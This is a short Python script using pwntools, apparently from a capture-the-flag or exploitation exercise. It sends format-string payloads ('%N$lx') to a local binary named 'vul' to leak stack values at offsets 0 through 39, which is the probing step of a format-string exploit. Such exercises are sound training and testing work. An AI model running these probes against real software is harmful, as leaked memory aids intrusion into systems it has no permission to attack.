from pwn import *

context.log_level = 'error'

# pty = process.PTY
# io = process(stdin=pty, stdout=pty)
# context.log_level = "INFO"

end = ""
for idx in range(40):
    vul = process("./vul")
    vul.sendline("%{}$lx".format(idx))
    vul.recvline()
    end += "{} : {}\n".format(idx, vul.recvline())
    vul.close()
print(end)
